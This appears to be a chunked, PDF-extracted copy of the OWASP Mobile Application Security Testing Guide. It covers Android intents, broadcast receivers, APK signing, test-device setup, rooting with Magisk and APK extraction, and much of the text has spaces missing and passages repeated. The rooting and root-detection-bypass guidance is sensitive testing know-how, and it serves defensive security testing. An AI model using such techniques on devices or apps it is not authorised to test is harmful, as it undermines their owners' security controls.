ImplicitintentsaresenttotheOStoperformagivenactiononagivensetofdata(TheURLoftheOWASPwebsiteinour examplebelow). Itisuptothesystemtodecidewhichapporclasswillperformthecorrespondingservice. Forinstance: ExampleinJava: Intentintent =newIntent(Intent.MY_ACTION,Uri.parse(\"https://www.owasp.org\")); ExampleinKotlin: varintent =Intent(Intent.MY_ACTION,Uri.parse(\"https://www.owasp.org\")) An intent filter is an expression in Android Manifest files that specifies the type of intents the component would like to receive. Forinstance,bydeclaringanintentfilterforanactivity,youmakeitpossibleforotherappstodirectlystartyour activitywithacertainkindofintent. Likewise,youractivitycanonlybestartedwithanexplicitintentifyoudon’tdeclare anyintentfiltersforit. Androidusesintentstobroadcastmessagestoapps(suchasanincomingcallorSMS)importantpowersupplyinformation (lowbattery,forexample),andnetworkchanges(lossofconnection,forinstance). Extradatamaybeaddedtointents (throughputExtra/getExtras). Hereisashortlistofintentssentbytheoperatingsystem. AllconstantsaredefinedintheIntentclass,andthewhole listisintheofficialAndroiddocumentation: • ACTION_CAMERA_BUTTON • ACTION_MEDIA_EJECT • ACTION_NEW_OUTGOING_CALL • ACTION_TIMEZONE_CHANGED To improve security and privacy, a Local Broadcast Manager is used to send and receive intents within an app without havingthemsenttotherestoftheoperatingsystem. Thisisveryusefulforensuringthatsensitiveandprivatedatadon’t leavetheappperimeter(geolocationdataforinstance). Broadcast Receivers BroadcastReceiversarecomponentsthatallowappstoreceivenotificationsfromotherappsandfromthesystemitself. With them, apps can react to events (internal, initiated by other apps, or initiated by the operating system). They are generallyusedtoupdateuserinterfaces,startservices,updatecontent,andcreateusernotifications. TherearetwowaystomakeaBroadcastReceiverknowntothesystem. OnewayistodeclareitintheAndroidManifest file. ThemanifestshouldspecifyanassociationbetweentheBroadcastReceiverandanintentfiltertoindicatetheactions thereceiverismeanttolistenfor. AnexampleBroadcastReceiverdeclarationwithanintentfilterinamanifest: <receiver android:name=\".MyReceiver\" > <intent-filter> <action android:name=\"com.owasp.myapplication.MY_ACTION\" /> </intent-filter> </receiver> Pleasenotethatinthisexample,theBroadcastReceiverdoesnotincludetheandroid:exportedattribute. Asatleast onefilterwasdefined,thedefaultvaluewillbesetto“true”. Inabsenceofanyfilters,itwillbesetto“false”. Theotherwayistocreatethereceiverdynamicallyincode. ThereceivercanthenregisterwiththemethodContext. registerReceiver. AnexampleofregisteringaBroadcastReceiverdynamically: ExampleinJava: 103\\n//Defineabroadcastreceiver BroadcastReceivermyReceiver =newBroadcastReceiver(){ @Override public void onReceive(Contextcontext,Intentintent){ Log.d(TAG,\"IntentreceivedbymyReceiver\"); } }; //Defineanintentfilterwithactionsthatthebroadcastreceiverlistensfor IntentFilterintentFilter =newIntentFilter(); intentFilter.addAction(\"com.owasp.myapplication.MY_ACTION\"); //Toregisterthebroadcastreceiver registerReceiver(myReceiver,intentFilter); //Toun-registerthebroadcastreceiver unregisterReceiver(myReceiver); ExampleinKotlin: //Defineabroadcastreceiver valmyReceiver:BroadcastReceiver =object :BroadcastReceiver(){ override funonReceive(context:Context,intent:Intent){ Log.d(FragmentActivity.TAG,\"IntentreceivedbymyReceiver\") } } //Defineanintentfilterwithactionsthatthebroadcastreceiverlistensfor valintentFilter =IntentFilter() intentFilter.addAction(\"com.owasp.myapplication.MY_ACTION\") //Toregisterthebroadcastreceiver registerReceiver(myReceiver,intentFilter) //Toun-registerthebroadcastreceiver unregisterReceiver(myReceiver) Notethatthesystemstartsanappwiththeregisteredreceiverautomaticallywhenarelevantintentisraised. According to Broadcasts Overview, a broadcast is considered “implicit” if it does not target an app specifically. After receivinganimplicitbroadcast,Androidwilllistallappsthathaveregisteredagivenactionintheirfilters. Ifmorethan oneapphasregisteredforthesameaction,Androidwillprompttheusertoselectfromthelistofavailableapps. An interesting feature of Broadcast Receivers is that they can be prioritized; this way, an intent will be delivered to all authorized receivers according to their priority. A priority can be assigned to an intent filter in the manifest via the android:priority attribute as well as programmatically via the IntentFilter.setPriority method. However, note thatreceiverswiththesameprioritywillberuninanarbitraryorder. Ifyourappisnotsupposedtosendbroadcastsacrossapps,useaLocalBroadcastManager(LocalBroadcastManager). Theycanbeusedtomakesureintentsarereceivedfromtheinternalapponly, andanyintentfromanyotherappwill bediscarded. Thisisveryusefulforimprovingsecurityandtheefficiencyoftheapp,asnointerprocesscommunication isinvolved. However,pleasenotethattheLocalBroadcastManagerclassisdeprecatedandGooglerecommendsusing alternativessuchasLiveData. FormoresecurityconsiderationsregardingBroadcastReceiver,seeSecurityConsiderationsandBestPractices. Implicit Broadcast Receiver Limitation AccordingtoBackgroundOptimizations,appstargetingAndroid7.0(APIlevel24)orhighernolongerreceiveCONNECTIV- ITY_ACTION broadcast unless they register their Broadcast Receivers with Context.registerReceiver(). The system doesnotsendACTION_NEW_PICTUREandACTION_NEW_VIDEObroadcastsaswell. According to Background Execution Limits, apps that target Android 8.0 (API level 26) or higher can no longer register BroadcastReceiversforimplicitbroadcastsintheirmanifest,exceptforthoselistedinImplicitBroadcastExceptions. The BroadcastReceiverscreatedatruntimebycallingContext.registerReceiverarenotaffectedbythislimitation. AccordingtoChangestoSystemBroadcasts,beginningwithAndroid9(APIlevel28),theNETWORK_STATE_CHANGED_ACTION broadcastdoesn’treceiveinformationabouttheuser’slocationorpersonallyidentifiabledata. Android Application Publishing Onceanapphasbeensuccessfullydeveloped,thenextstepistopublishandshareitwithothers. However,appscan’t simplybeaddedtoastoreandshared,theymustbefirstsigned. Thecryptographicsignatureservesasaverifiablemark placedbythedeveloperoftheapp. Itidentifiestheapp’sauthorandensuresthattheapphasnotbeenmodifiedsince itsinitialdistribution. 104\\nSigning Process Duringdevelopment,appsaresignedwithanautomaticallygeneratedcertificate. Thiscertificateisinherentlyinsecure andisfordebuggingonly. Moststoresdon’tacceptthiskindofcertificateforpublishing;therefore,acertificatewithmore securefeaturesmustbecreated. WhenanapplicationisinstalledontheAndroiddevice,thePackageManagerensures thatithasbeensignedwiththecertificateincludedinthecorrespondingAPK.Ifthecertificate’spublickeymatchesthe key used to sign any other APK on the device, the new APK may share a UID with the pre-existing APK. This facilitates interactionsbetweenapplicationsfromasinglevendor. Alternatively, specifyingsecuritypermissionsfortheSignature protectionlevelispossible;thiswillrestrictaccesstoapplicationsthathavebeensignedwiththesamekey. APK Signing Schemes Androidsupportsthreeapplicationsigningschemes. StartingwithAndroid9(APIlevel28),APKscanbeverifiedwithAPK SignatureSchemev3(v3scheme),APKSignatureSchemev2(v2scheme)orJARsigning(v1scheme). ForAndroid7.0 (APIlevel24)andabove,APKscanbeverifiedwiththeAPKSignatureSchemev2(v2scheme)orJARsigning(v1scheme).",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 59
    }
  },
  {
    "text": "However,appscan’t simplybeaddedtoastoreandshared,theymustbefirstsigned. Thecryptographicsignatureservesasaverifiablemark placedbythedeveloperoftheapp. Itidentifiestheapp’sauthorandensuresthattheapphasnotbeenmodifiedsince itsinitialdistribution. 104\\nSigning Process Duringdevelopment,appsaresignedwithanautomaticallygeneratedcertificate. Thiscertificateisinherentlyinsecure andisfordebuggingonly. Moststoresdon’tacceptthiskindofcertificateforpublishing;therefore,acertificatewithmore securefeaturesmustbecreated. WhenanapplicationisinstalledontheAndroiddevice,thePackageManagerensures thatithasbeensignedwiththecertificateincludedinthecorrespondingAPK.Ifthecertificate’spublickeymatchesthe key used to sign any other APK on the device, the new APK may share a UID with the pre-existing APK. This facilitates interactionsbetweenapplicationsfromasinglevendor. Alternatively, specifyingsecuritypermissionsfortheSignature protectionlevelispossible;thiswillrestrictaccesstoapplicationsthathavebeensignedwiththesamekey. APK Signing Schemes Androidsupportsthreeapplicationsigningschemes. StartingwithAndroid9(APIlevel28),APKscanbeverifiedwithAPK SignatureSchemev3(v3scheme),APKSignatureSchemev2(v2scheme)orJARsigning(v1scheme). ForAndroid7.0 (APIlevel24)andabove,APKscanbeverifiedwiththeAPKSignatureSchemev2(v2scheme)orJARsigning(v1scheme). Forbackwardscompatibility,anAPKcanbesignedwithmultiplesignatureschemesinordertomaketheapprunonboth newerandolderSDKversions. Olderplatformsignorev2signaturesandverifyv1signaturesonly. JAR Signing (v1 Scheme) TheoriginalversionofappsigningimplementsthesignedAPKasastandardsignedJAR,whichmustcontainalltheentries inMETA-INF/MANIFEST.MF.Allfilesmustbesignedwithacommoncertificate. Thisschemedoesnotprotectsomeparts oftheAPK,suchasZIPmetadata. ThedrawbackofthisschemeisthattheAPKverifierneedstoprocessuntrusteddata structures before applying the signature, and the verifier discards data the data structures don’t cover. Also, the APK verifiermustdecompressallcompressedfiles,whichtakesconsiderabletimeandmemory. APK Signature Scheme (v2 Scheme) WiththeAPKsignaturescheme,thecompleteAPKishashedandsigned,andanAPKSigningBlockiscreatedandinserted intotheAPK.Duringvalidation,thev2schemechecksthesignaturesoftheentireAPKfile. ThisformofAPKverificationis fasterandoffersmorecomprehensiveprotectionagainstmodification. YoucanseetheAPKsignatureverificationprocess forv2Schemebelow. APK Signature Scheme (v3 Scheme) Thev3APKSigningBlockformatisthesameasv2. V3addsinformationaboutthesupportedSDKversionsandaproof- of-rotationstructtotheAPKsigningblock. InAndroid9(APIlevel28)andhigher,APKscanbeverifiedaccordingtoAPK SignatureSchemev3,v2orv1scheme. Olderplatformsignorev3signaturesandtrytoverifyv2thenv1signature. 105\\nThe proof-of-rotation attribute in the signed-data of the signing block consists of a singly-linked list, with each node containingasigningcertificateusedtosignpreviousversionsoftheapp. Tomakebackwardcompatibilitywork,theold signingcertificatessignthenewsetofcertificates,thusprovidingeachnewkeywithevidencethatitshouldbeastrusted astheolderkey(s). ItisnolongerpossibletosignAPKsindependently,becausetheproof-of-rotationstructuremusthave theoldsigningcertificatessigningthenewsetofcertificates,ratherthansigningthemone-by-one. YoucanseetheAPK signaturev3schemeverificationprocessbelow. APK Signature Scheme (v4 Scheme) TheAPKSignatureSchemev4wasintroducedalongwithAndroid11(APIlevel30)andrequiresalldeviceslaunchedwith Android11anduptohavefs-verityenabledbydefault. fs-verityisaLinuxkernelfeaturethatisprimarilyusedforfile authentication (detection of malicious modifications) due to its extremely efficient file hash calculation. Read requests onlywillsucceedifthecontentverifiesagainsttrusteddigitalcertificatesthatwereloadedtothekernelkeyringduring boottime. The v4 signature requires a complementary v2 or v3 signature and in contrast to previous signature schemes, the v4 signature is stored in a separate file <apk name>.apk.idsig. Remember to specify it using the --v4-signature-file flagwhenverifyingav4-signedAPKwithapksigner verify. YoucanfindmoredetailedinformationintheAndroiddeveloperdocumentation. Creating Your Certificate Androidusespublic/privatecertificatestosignAndroidapps(.apkfiles). Certificatesarebundlesofinformation;interms of security, keys are the most important part of that bundle. Public certificates contain users’ public keys, and private certificates contain users’ private keys. Public and private certificates are linked. Certificates are unique and can’t be re-generated. Notethatifacertificateislost,itcannotberecovered,soupdatinganyappssignedwiththatcertificate becomesimpossible. Appcreatorscaneitherreuseanexistingprivate/publickeypairthatisinanavailableKeyStoreor generateanewpair. IntheAndroidSDK,anewkeypairisgeneratedwiththekeytoolcommand. Thefollowingcommand createsaRSAkeypairwithakeylengthof2048bitsandanexpirytimeof7300days=20years. Thegeneratedkeypair isstoredinthefile‘myKeyStore.jks’,whichisinthecurrentdirectory: keytool -genkey -alias myDomain -keyalg RSA-keysize 2048 -validity 7300 -keystore myKeyStore.jks -storepass myStrongPassword Safelystoringyoursecretkeyandmakingsureitremainssecretduringitsentirelifecycleisofparamountimportance. Anyone who gains access to the key will be able to publish updates to your apps with content that you don’t control (therebyaddinginsecurefeaturesoraccessingsharedcontentwithsignature-basedpermissions). Thetrustthatauser placesinanappanditsdevelopersisbasedtotallyonsuchcertificates;certificateprotectionandsecuremanagement are therefore vital for reputation and customer retention, and secret keys must never be shared with other individuals. Keysarestoredinabinaryfilethatcanbeprotectedwithapassword;suchfilesarereferredtoasKeyStores. KeyStore passwordsshouldbestrongandknownonlytothekeycreator. Forthisreason,keysareusuallystoredonadedicated 106\\nbuild machine that developers have limited access to. An Android certificate must have a validity period that’s longer thanthatoftheassociatedapp(includingupdatedversionsoftheapp). Forexample,GooglePlaywillrequirecertificates toremainvaliduntilOct22nd,2033atleast. Signing an Application The goal of the signing process is to associate the app file (.apk) with the developer’s public key. To achieve this, the developercalculatesahashoftheAPKfileandencryptsitwiththeirownprivatekey. Thirdpartiescanthenverifythe app’sauthenticity(e.g.,thefactthattheappreallycomesfromtheuserwhoclaimstobetheoriginator)bydecrypting theencryptedhashwiththeauthor’spublickeyandverifyingthatitmatchestheactualhashoftheAPKfile. Many Integrated Development Environments(IDE) integrate the app signing process to makeit easier for the user. Be awarethatsomeIDEsstoreprivatekeysincleartextinconfigurationfiles;double-checkthisincaseothersareableto accesssuchfilesandremovetheinformationifnecessary. Appscanbesignedfromthecommandlinewiththe‘apksigner’ toolprovidedbytheAndroidSDK(APIlevel24andhigher). Itislocatedat[SDK-Path]/build-tools/[version]. ForAPI 24.0.2andbelow,youcanuse‘jarsigner’,whichispartoftheJavaJDK.Detailsaboutthewholeprocesscanbefoundin officialAndroiddocumentation;however,anexampleisgivenbelowtoillustratethepoint. apksignersign --out mySignedApp.apk --ks myKeyStore.jksmyUnsignedApp.apk Inthisexample,anunsignedapp(‘myUnsignedApp.apk’)willbesignedwithaprivatekeyfromthedeveloperKeyStore ‘myKeyStore.jks’(locatedinthecurrentdirectory). Theappwillbecomeasignedappcalled‘mySignedApp.apk’andwill bereadytoreleasetostores. Zipalign ThezipaligntoolshouldalwaysbeusedtoaligntheAPKfilebeforedistribution. Thistoolalignsalluncompresseddata (suchasimages,rawfiles,and4-byteboundaries)withintheAPK,whichhelpsimprovememorymanagementduringapp runtime. ZipalignmustbeusedbeforetheAPKfileissignedwithapksigner. Publishing Process Distributing apps from anywhere (your own site, any store, etc.) is possible because the Android ecosystem is open. However,GooglePlayisthemostwell-known,trusted,andpopularstore,andGoogleitselfprovidesit. AmazonAppstore is the trusted default store for Kindle devices. If users want to install third-party apps from a non-trusted source, they mustexplicitlyallowthiswiththeirdevicesecuritysettings. Apps can be installed on an Android device from a variety of sources: locally via USB, via Google’s official app store (GooglePlayStore)orfromalternativestores. Whereas other vendors may review and approve apps before they are actually published, Google will simply scan for known malware signatures; this minimizes the time between the beginning of the publishing process and public app availability. Publishing an app is quite straightforward;",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 60
    }
  },
  {
    "text": "via USB, via Google’s official app store (GooglePlayStore)orfromalternativestores. Whereas other vendors may review and approve apps before they are actually published, Google will simply scan for known malware signatures; this minimizes the time between the beginning of the publishing process and public app availability. Publishing an app is quite straightforward; the main operation is making the signed APK file downloadable. On Google Play, publishingstartswithaccountcreationandisfollowedbyappdeliverythroughadedicatedinterface. Detailsare availableattheofficialAndroiddocumentation. 107\\nAndroid Security Testing Inthischapter,we’lldiveintosettingupasecuritytestingenvironmentandintroduceyoutosomepracticalprocesses andtechniquesfortestingthesecurityofAndroidapps. ThesearethebuildingblocksfortheMASTGtestcases. Android Testing Setup YoucansetupafullyfunctioningtestenvironmentonalmostanymachinerunningWindows,Linux,ormacOS. Host Device At the very least, you’ll need Android Studio (which comes with the Android SDK) platform tools, an emulator, and an apptomanagethevariousSDKversionsandframeworkcomponents. AndroidStudioalsocomeswithanAndroidVirtual Device(AVD)Managerapplicationforcreatingemulatorimages. MakesurethatthenewestSDKtoolsandplatformtools packagesareinstalledonyoursystem. Inaddition,youmaywanttocompleteyourhostsetupbyinstallingtheAndroidNDKifyou’replanningtoworkwithapps containingnativelibraries. Sometimesitcanbeusefultodisplayorcontroldevicesfromthecomputer. Toachievethis,youcanuseScrcpy. Testing Device For dynamic analysis, you’ll need an Android device to run the target app on. In principle, you can test without a real Androiddeviceanduseonlytheemulator. However, appsexecutequiteslowlyonaemulator, andsimulatorsmaynot giverealisticresults. Testingonarealdevice makesfora smootherprocessandamorerealisticenvironment. On the otherhand,emulatorsallowyoutoeasilychangeSDKversionsorcreatemultipledevices. Afulloverviewoftheprosand consofeachapproachislistedinthetablebelow. Property Physical Emulator/Simulator Abilitytorestore Softbricksarealwayspossible,but Emulatorscancrashorbecome newfirmwarecantypicallystillbe corrupt,butanewonecanbecreated flashed. Hardbricksareveryrare. orasnapshotcanberestored. Reset Canberestoredtofactorysettingsor Emulatorscanbedeletedand reflashed. recreated. Snapshots Notpossible. Supported,greatformalware analysis. Speed Muchfasterthanemulators. Typicallyslow,butimprovementsare beingmade. Cost Typicallystartat$200forausable Bothfreeandcommercialsolutions device. Youmayrequiredifferent exist. devices,suchasonewithorwithouta biometricsensor. Easeofrooting Highlydependentonthedevice. Typicallyrootedbydefault. Easeofemulatordetection It’snotanemulator,soemulator Manyartefactswillexist,makingit checksarenotapplicable. easytodetectthattheappisrunning inanemulator. Easeofrootdetection Easiertohideroot,asmanyroot Emulatorswillalmostalwaystrigger detectionalgorithmscheckfor rootdetectionalgorithmsduetothe emulatorproperties. WithMagisk factthattheyarebuiltfortestingwith Systemlessrootit’snearlyimpossible manyartefactsthatcanbefound. todetect. 108\\nProperty Physical Emulator/Simulator Hardwareinteraction EasyinteractionthroughBluetooth, Usuallyfairlylimited,withemulated NFC,4G,Wi-Fi,biometrics,camera, hardwareinput(e.g.randomGPS GPS,gyroscope,... coordinates) APIlevelsupport Dependsonthedeviceandthe Alwayssupportsthelatestversions, community. Activecommunitieswill includingbetareleases. Emulators keepdistributingupdatedversions containingspecificAPIlevelscan (e.g.LineageOS),whilelesspopular easilybedownloadedandlaunched. devicesmayonlyreceiveafew updates. Switchingbetweenversions requiresflashingthedevice,atedious process. Nativelibrarysupport Nativelibrariesareusuallybuiltfor Someemulatorsrunonx86CPUs,so ARMdevices,sotheywillworkona theymaynotbeabletorunpackaged physicaldevice. nativelibraries. Malwaredanger Malwaresamplescaninfectadevice, Malwaresamplescaninfectan butifyoucanclearoutthedevice emulator,buttheemulatorcansimply storageandflashacleanfirmware, beremovedandrecreated. Itisalso therebyrestoringittofactory possibletocreatesnapshotsand settings,thisshouldnotbeaproblem. comparedifferentsnapshotstohelp Beawarethattherearemalware inmalwareanalysis. Beawarethat samplesthattrytoexploittheUSB therearemalwareproofsofconcept bridge. whichtrytoattackthehypervisor. Testing on a Real Device Almostanyphysicaldevicecanbeusedfortesting,butthereareafewconsiderationstobemade. First,thedeviceneeds toberootable. Thisistypicallyeitherdonethroughanexploit,orthroughanunlockedbootloader. Exploitsarenotalways available,andthebootloadermaybelockedpermanently,oritmayonlybeunlockedoncethecarriercontracthasbeen terminated. The best candidates are flagship Google pixel devices built for developers. These devices typically come with an un- lockable bootloader, opensource firmware, kernel, radio available online and official OS source code. The developer communitiespreferGoogledevicesastheOSisclosesttotheandroidopensourceproject. Thesedevicesgenerallyhave thelongestsupportwindowswith2yearsofOSupdatesand1yearofsecurityupdatesafterthat. Alternatively,Google’sAndroidOneprojectcontainsdevicesthatwillreceivethesamesupportwindows(2yearsofOS updates, 1 year of security updates) and have near-stock experiences. While it was originally started as a project for low-enddevices,theprogramhasevolvedtoincludemid-rangeandhigh-endsmartphones,manyofwhichareactively supportedbythemoddingcommunity. DevicesthataresupportedbytheLineageOSprojectarealsoverygoodcandidatesfortestdevices. Theyhaveanactive community,easytofollowflashingandrootinginstructionsandthelatestAndroidversionsaretypicallyquicklyavailable as a Lineage installation. LineageOS also continues support for new Android versions long after the OEM has stopped distributingupdates. WhenworkingwithanAndroidphysicaldevice,you’llwanttoenableDeveloperModeandUSBdebuggingonthedevice inordertousetheADBdebugginginterface. SinceAndroid4.2(APIlevel16),theDeveloperoptionssubmenuinthe Settingsappishiddenbydefault. Toactivateit,taptheBuild numbersectionoftheAbout phoneviewseventimes. Notethatthebuildnumberfield’slocationvariesslightlybydevice. Forexample,onLGPhones,itisunderAboutphone ->Softwareinformation. Onceyouhavedonethis,DeveloperoptionswillbeshownatbottomoftheSettingsmenu. Oncedeveloperoptionsareactivated,youcanenabledebuggingwiththeUSBdebuggingswitch. Testing on an Emulator Multipleemulatorsexist,onceagainwiththeirownstrengthsandweaknesses: Freeemulators: 109\\n• AndroidVirtualDevice(AVD)-Theofficialandroidemulator,distributedwithAndroidStudio. • AndroidX86-Anx86portoftheAndroidcodebase Commercialemulators: • Genymotion-Matureemulatorwithmanyfeatures,bothaslocalandcloud-basedsolution. Freeversionavailable fornon-commercialuse. • Corellium-Offerscustomdevicevirtualizationthroughacloud-basedoron-premsolution. AlthoughthereexistseveralfreeAndroidemulators,werecommendusingAVDasitprovidesenhancedfeaturesappro- priatefortestingyourappcomparedtotheothers. Intheremainderofthisguide,wewillusetheofficialAVDtoperform tests. AVDsupportssomehardwareemulation,suchasGPSorSMSthroughitsso-calledExtendedControlsaswellasmotion sensors. YoucaneitherstartanAndroidVirtualDevice(AVD)byusingtheAVDManagerinAndroidStudioorstarttheAVDmanager fromthecommandlinewiththeandroidcommand,whichisfoundinthetoolsdirectoryoftheAndroidSDK: ./androidavd SeveraltoolsandVMsthatcanbeusedtotestanappwithinanemulatorenvironmentareavailable: • MobSF • Nathan(notupdatedsince2016) Pleasealsoverifythe“TestingTools”chapterattheendofthisbook. Getting Privileged Access Rooting (i.e., modifying the OS so that you can run commands as the root user) is recommended for testing on a real device. Thisgivesyoufullcontrolovertheoperatingsystemandallowsyoutobypassrestrictionssuchasappsandboxing. Theseprivilegesinturnallowyoutousetechniqueslikecodeinjectionandfunctionhookingmoreeasily. Notethatrootingisrisky,andthreemainconsequencesneedtobeclarifiedbeforeyouproceed. Rootingcanhavethe followingnegativeeffects: • voidingthedevicewarranty(alwayscheckthemanufacturer’spolicybeforetakinganyaction) • “bricking”thedevice,i.e.,renderingitinoperableandunusable • creatingadditionalsecurityrisks(becausebuilt-inexploitmitigationsareoftenremoved) Youshouldnotrootapersonaldevicethatyoustoreyourprivateinformationon. Werecommendgettingacheap,dedi- catedtestdeviceinstead. Manyolderdevices,suchasGoogle’sNexusseries,canrunthenewestAndroidversionsand areperfectlyfinefortesting. You need to understand that rooting your device is ultimately YOUR decision and that OWASP shall in no waybeheldresponsibleforanydamage. Ifyou’reuncertain,seekexpertadvicebeforestartingtherooting process. Which Mobiles Can Be Rooted Virtually any Android mobile can be rooted. Commercial versions of Android OS (which are Linux OS evolutions at the kernellevel)areoptimizedforthemobileworld. Somefeatureshavebeenremovedordisabledfortheseversions, for example,non-privilegedusers’abilitytobecomethe‘root’user(whohaselevatedprivileges). Rootingaphonemeans allowinguserstobecometherootuser,e.g.,addingastandardLinuxexecutablecalledsu,whichisusedtochangeto anotheruseraccount. Torootamobiledevice,firstunlockitsbootloader. Theunlockingproceduredependsonthedevicemanufacturer. How- ever,forpracticalreasons,rootingsomemobiledevicesismorepopularthanrootingothers,particularlywhenitcomesto securitytesting: devicescreatedbyGoogleandmanufacturedbycompanieslikeSamsung,LG,andMotorolaareamong themostpopular,particularlybecausetheyareusedbymanydevelopers. Thedevicewarrantyisnotnullifiedwhenthe bootloaderisunlockedandGoogleprovidesmanytoolstosupporttherootitself. 110\\nRooting with Magisk Magisk(“MagicMask”)isonewaytorootyourAndroiddevice. Itsspecialtyliesinthewaythemodificationsonthesystem areperformed. Whileotherrootingtoolsaltertheactualdataonthesystempartition,Magiskdoesnot(whichiscalled “systemless”). Thisenablesawaytohidethemodificationsfromroot-sensitiveapplications(e.g.forbankingorgames) andallowsusingtheofficialAndroidOTAupgradeswithouttheneedtounrootthedevicebeforehand. YoucangetfamiliarwithMagiskreadingtheofficialdocumentationonGitHub. Ifyoudon’thaveMagiskinstalled,youcan findinstallationinstructionsinthedocumentation.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 61
    }
  },
  {
    "text": "Be Rooted Virtually any Android mobile can be rooted. Commercial versions of Android OS (which are Linux OS evolutions at the kernellevel)areoptimizedforthemobileworld. Somefeatureshavebeenremovedordisabledfortheseversions, for example,non-privilegedusers’abilitytobecomethe‘root’user(whohaselevatedprivileges). Rootingaphonemeans allowinguserstobecometherootuser,e.g.,addingastandardLinuxexecutablecalledsu,whichisusedtochangeto anotheruseraccount. Torootamobiledevice,firstunlockitsbootloader. Theunlockingproceduredependsonthedevicemanufacturer. How- ever,forpracticalreasons,rootingsomemobiledevicesismorepopularthanrootingothers,particularlywhenitcomesto securitytesting: devicescreatedbyGoogleandmanufacturedbycompanieslikeSamsung,LG,andMotorolaareamong themostpopular,particularlybecausetheyareusedbymanydevelopers. Thedevicewarrantyisnotnullifiedwhenthe bootloaderisunlockedandGoogleprovidesmanytoolstosupporttherootitself. 110\\nRooting with Magisk Magisk(“MagicMask”)isonewaytorootyourAndroiddevice. Itsspecialtyliesinthewaythemodificationsonthesystem areperformed. Whileotherrootingtoolsaltertheactualdataonthesystempartition,Magiskdoesnot(whichiscalled “systemless”). Thisenablesawaytohidethemodificationsfromroot-sensitiveapplications(e.g.forbankingorgames) andallowsusingtheofficialAndroidOTAupgradeswithouttheneedtounrootthedevicebeforehand. YoucangetfamiliarwithMagiskreadingtheofficialdocumentationonGitHub. Ifyoudon’thaveMagiskinstalled,youcan findinstallationinstructionsinthedocumentation. IfyouuseanofficialAndroidversionandplantoupgradeit,Magisk providesatutorialonGitHub. Furthermore,developerscanusethepowerofMagisktocreatecustommodulesandsubmitthemtotheofficialMagisk Modules repository. Submitted modules can then be installed inside the Magisk Manager application. One of these installablemodulesisasystemlessversionofthefamousXposedFramework(availableforSDKversionsupto27). Root Detection Anextensivelistofrootdetectionmethodsispresentedinthe“TestingAnti-ReversingDefensesonAndroid”chapter. Foratypicalmobileappsecuritybuild, you’llusuallywanttotestadebugbuildwithrootdetectiondisabled. Ifsucha buildisnotavailablefortesting, youcandisablerootdetectioninavarietyofwaysthatwillbeintroducedlaterinthis book. Installing Apps Platform: android Useadb installtoinstallanAPKonanemulatororconnecteddevice. adbinstallpath_to_apk NotethatifyouhavetheoriginalsourcecodeanduseAndroidStudio,youdonotneedtodothisbecauseAndroidStudio handlesthepackagingandinstallationoftheappforyou. Obtaining and Extracting Apps Platform: android There are several ways of extracting APK files from a device. You will need to decide which one is the easiest method dependingiftheappispublicorprivate. Alternative App Stores One of the easiest options is to download the APK from websites that mirror public applications from the Google Play Store. However,keepinmindthatthesesitesarenotofficialandthereisnoguaranteethattheapplicationhasn’tbeen repackagedorcontainmalware. AfewreputablewebsitesthathostAPKsandarenotknownformodifyingappsandeven listSHA-1andSHA-256checksumsoftheappsare: • APKMirror • APKPure Beware that you do not have control over these sites and you cannot guarantee what they do in the future. Only use themifit’syouronlyoptionleft. 111\\nUsing gplaycli Youcanusegplayclitodownload(-d)theselectedAPKbyspecifyingitsAppID(add-ptoshowaprogressbarand-vfor verbosity): $gplaycli -p-v-dcom.google.android.keep [INFO]GPlayCliversion3.26 [Python3.7.4] [INFO]Configurationfileis~/.config/gplaycli/gplaycli.conf [INFO]Deviceisbacon [INFO]Usingcachedtoken. [INFO]UsingautoretrievedtokentoconnecttoAPI [INFO]1/1com.google.android.keep [################################]15.78MB/15.78MB -00:00:026.57MB/s/s [INFO]Downloadcomplete Thecom.google.android.keep.apkfilewillbeinyourcurrentdirectory. Asyoumightimagine,thisapproachisavery convenientwaytodownloadAPKs,especiallywithregardstoautomation. YoumayuseyourownGooglePlaycredentialsortoken. Bydefault,gplaycliwilluseaninternallyprovidedtoken. Extracting the App Package from the Device Obtainingapppackagesfromthedeviceistherecommendedmethodaswecanguaranteetheapphasn’tbeenmodified byathird-party. Toobtainapplicationsfromarootedornon-rooteddevice,youcanusethefollowingmethods: UseadbpulltoretrievetheAPK.Ifyoudon’tknowthepackagename,thefirststepistolistalltheapplicationsinstalled onthedevice: adbshellpmlistpackages Onceyouhavelocatedthepackagenameoftheapplication,youneedthefullpathwhereitisstoredonthesystemto downloadit. adbshellpmpath <packagename> WiththefullpathtotheAPK,youcannowsimplyuseadb pulltoextractit. adbpull <apkpath> TheAPKwillbedownloadedinyourworkingdirectory. Alternatively, there are also apps like APK Extractor that do not require root and can even share the extracted APK via yourpreferredmethod. Thiscanbeusefulifyoudon’tfeellikeconnectingthedeviceorsettingupadboverthenetwork totransferthefile. Testing Instant Apps With Google Play Instant you can create Instant apps which can be instantly launched from a browser or the “try now” buttonfromtheappstorefromAndroid5.0(APIlevel21)onward. Theydonotrequireanyformofinstallation. Thereare afewchallengeswithaninstantapp: • Thereisalimitedamountofsizeyoucanhavewithaninstantapp. • Onlyareducednumberofpermissionscanbeused,whicharedocumentedatAndroidInstantappdocumentation. Thecombinationofthesecanleadtoinsecuredecisions,suchas:strippingtoomuchoftheauthorization/authentication/confidentiality logicfromanapp,whichallowsforinformationleakage. Note: InstantappsrequireanAppBundle. AppBundlesaredescribedinthe“AppBundles”sectionofthe“AndroidPlatform Overview”chapter. StaticAnalysisConsiderations: 112\\nStaticanalysiscanbeeitherdoneafterreverseengineeringadownloadedinstantapp,orbyanalyzingtheAppBundle. WhenyouanalyzetheAppBundle,checktheAndroidManifesttoseewhetherdist:moduledist:instant=\"true\"isset foragivenmodule(eitherthebaseoraspecificmodulewithdist:moduleset). Next,checkforthevariousentrypoints, whichentrypointsareset(bymeansof<data android:path=\"</PATH/HERE>\" />). Nowfollowtheentrypoints,likeyouwoulddoforanyActivityandcheck: • Isthereanydataretrievedbytheappwhichshouldrequireprivacyprotectionofthatdata? Ifso,areallrequired controlsinplace? • Areallcommunicationssecured? • Whenyouneedmorefunctionalities,aretherightsecuritycontrolsdownloadedaswell? DynamicAnalysisConsiderations: Therearemultiplewaystostartthedynamicanalysisofyourinstantapp. Inallcases, youwillfirsthavetoinstallthe supportforinstantappsandaddtheiaexecutabletoyour$PATH. Theinstallationofinstantappsupportistakencareoffthroughthefollowingcommand: cdpath/to/android/sdk/tools/bin && ./sdkmanager 'extras;google;instantapps' 